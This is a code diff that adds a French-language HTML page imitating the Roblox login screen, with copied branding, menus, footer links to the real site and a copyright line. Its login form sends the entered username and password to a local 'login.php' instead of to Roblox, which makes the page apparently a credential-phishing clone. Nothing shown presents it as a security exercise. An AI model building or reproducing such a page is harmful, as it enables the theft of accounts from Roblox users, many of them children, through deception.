@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion à Roblox</title>
+    <link href="../images/logo1.png" rel="icon">
+    
+    <link rel="stylesheet" href="css/style.css">
+    <script src="js/menu.js" defer></script>
+    <script src="js/login.js" defer></script>
+    <script src="js/search.js" defer></script>
+</head>
+<body>
+
+    <nav class="navbar">
+        <div class="logo">
+            <img src="images/logoDroite.png" class="logo-small">
+            <img src="images/logoDroite.png" class="logo-large">
+        </div>
+        <div class="menu-toggle" id="menu-toggle">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </div>
+        <ul class="menu" id="menu">
+            <li><a href="https://www.roblox.com/charts">Charts</a></li>
+            <li><a href="https://www.roblox.com/catalog">Marketplace</a></li>
+            <li><a href="https://create.roblox.com/">Créer</a></li>
+            <li><a href="https://www.roblox.com/upgrades/robux?ctx=navpopover">Robux</a></li>
+            <li>
+                <div class="search-container">
+                    <input type="text" id="search-input" placeholder="Rechercher" maxlength="30" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" oninput="filterResults()">
+                    <img src="images/search.png" class="search-icon">
+                    <img src="images/clear.png" class="clear-icon" onclick="clearSearch()">
+                    <div id="dropdown" class="dropdown">
+                        <div class="dropdown-item" id="experience-item">
+                            <img src="images/experiences.png" class="dropdown-icon">
+                            <span class="search-text"></span> <span>Dans Experiences</span>
+                        </div>
+                        <div class="dropdown-item" id="people-item">
+                            <img src="images/people.png" class="dropdown-icon">
+                            <span class="search-text"></span> <span>Dans Utilisateurs</span>
+                        </div>
+                        <div class="dropdown-item" id="groups-item">
+                            <img src="images/groups.png" class="dropdown-icon">
+                            <span class="search-text"></span> <span>Dans Groupes</span>
+                        </div>
+                        <div class="dropdown-item" id="marketplace-item">
+                            <img src="images/marketplace.png" class="dropdown-icon">
+                            <span class="search-text"></span> <span>Dans Marketplace</span>
+                        </div>
+                    </div>
+                </div>
+            </li>
+        </ul>
+        <div class="signup-container">
+            <a href="https://www.roblox.com/account/signupredir?returnUrl=" class="signup-button">S'inscrire</a>
+            <a href="https://www.roblox.com/fr/Login" class="boutonConnexion">Connexion</a>
+        </div>
+    </nav>
+
+    <div class="main">
+        <div class="login-container">
+            <h1>Connexion à Roblox</h1>
+            <form action="login.php" method="POST" onsubmit="validateForm(event)">
+                <div class="input-field">
+                    <input type="text" name="username" placeholder="Identifiant/E-mail/Téléphone">
+                </div>
+                <div class="input-field">
+                    <input  type="password" name="password" placeholder="Mot de passe">
+                </div>
+                <div id="error-message"></div>
+                <div id="loading">
+                    <div class="cube"></div>
+                    <div class="cube"></div>
+                    <div class="cube"></div>
+                </div>
+                <button type="submit" class="login-button" id="login-button">Connexion</button>
+            </form>
+
+            <p><a href="https://www.roblox.com/login/forgot-password-or-username">Mot de passe ou nom d'utilisateur oublié ?</a></p>
+
+            <div class="separator"></div>
+
+            <button class="secondary-button">Envoyer-moi un code unique par email</button>
+            <button class="secondary-button">Utiliser un autre appareil</button>
+
+            <div class="footer">
+                <p>Vous n'avez pas de compte ? <a href="https://www.roblox.com/">S'inscrire</a></p>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer-container">
+        <div class="footer-links">
+            <a href="https://www.roblox.com/info/about-us">A propos</a>
+            <a href="https://www.roblox.com/info/jobs">Emplois</a>
+            <a href="https://www.roblox.com/info/blog">Blog</a>
+            <a href="https://www.roblox.com/info/parents">Parents</a>
+            <a href="https://www.roblox.com/giftcards">Acheter des cartes-cadeaux</a>
+            <a href="https://www.roblox.com/info/help">Aide</a>
+            <a href="https://www.roblox.com/info/terms">Conditions</a>
+            <a href="https://www.roblox.com/info/accessibility">Accessibilité</a>
+            <a href="https://www.roblox.com/info/privacy">Confidentialité</a>
+            <a href="https://www.roblox.com/my/account#!/privacy">
+               Tes choix en matière de vie privée
+                <img src="images/privacy.png" class="privacy-icon">
+            </a>
+            <a href="#">Option des cookies</a>
+        </div>
+        
+        <div class="footer-stripe"></div>
+        
+        <div class="footer-notice">
+            <p>©2025 Roblox Corporation. Roblox, le logo Roblox et Powering Imagination font partie de nos marques de commerce déposées ou non, aux États-Unis et dans d'autres pays.</p>
+        </div>
+    </footer>    
+
+</body>
+</html>
